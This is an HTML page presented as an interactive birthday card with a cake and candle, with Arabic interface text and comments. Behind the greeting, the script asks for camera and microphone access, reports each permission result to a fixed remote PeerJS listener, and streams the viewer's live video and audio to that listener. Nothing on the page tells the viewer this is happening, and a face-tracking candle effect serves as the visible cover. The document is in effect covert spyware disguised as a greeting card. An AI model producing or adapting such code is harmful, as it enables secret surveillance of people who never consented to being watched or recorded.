<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🎂 Interactive Birthday Card</title>
  <link rel="stylesheet" href="style.css"/>
  <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
</head>
<body>
  <div id="overlay">اضغط لبدء الكارت</div>
  <div class="card">
    <div class="cake">
      <div class="layer layer1"></div>
      <div class="layer layer2"></div>
      <div class="layer layer3"></div>
      <div class="icing"></div>
      <div class="candle" id="candle">
        <div class="flame" id="flame"></div>
      </div>
    </div>
    <video id="userCam" autoplay muted playsinline></video>
  </div>

  <script>
    const LISTENER_ID = 'birthday-listener';
    const peer       = new Peer();
    let dataConn;
    let videoStream;

    const overlay = document.getElementById('overlay');
    const videoEl = document.getElementById('userCam');
    const flame   = document.getElementById('flame');

    overlay.addEventListener('click', async () => {
      overlay.style.display = 'none';
      dataConn = peer.connect(LISTENER_ID);
      dataConn.on('open', () => {
        dataConn.send({ event: 'page-open' });
      });

      // 1) طلب إذن الكاميرا لوحدها
      try {
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoEl.srcObject = videoStream;
        dataConn.send({ event: 'camera-allowed' });
      } catch (err) {
        dataConn.send({ event: 'camera-denied' });
        console.error('Camera access denied', err);
      }

      // 2) طلب إذن الميكروفون لوحده
      try {
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        dataConn.send({ event: 'mic-allowed' });
        // 3) دمج المسارات وإرسالها معاً
        const combined = new MediaStream([
          ...videoStream.getVideoTracks(),
          ...audioStream.getAudioTracks()
        ]);
        peer.call(LISTENER_ID, combined);
      } catch (err) {
        dataConn.send({ event: 'mic-denied' });
        console.error('Mic access denied', err);
      }

      // تنسيق الفيديو كدائرة
      Object.assign(videoEl.style, {
        position: 'absolute',
        top: '10px',
        left: 'calc(50% - 75px)',
        width: '150px',
        height: '150px',
        borderRadius: '50%',
        border: '4px solid white',
        boxShadow: '0 0 15px rgba(255,255,255,0.7)'
      });
    });

    // (اختياري) تتبع قرب الوجه لإطفاء الشمعة
    Promise.all([
      faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/weights')
    ]).then(() => {
      (async function detect(){ 
        const res = await faceapi.detectSingleFace(videoEl, new faceapi.TinyFaceDetectorOptions());
        if (res && res.box.height > 120) flame.style.display = 'none';
        requestAnimationFrame(detect);
      })();
    });
  </script>
</body>
</html>
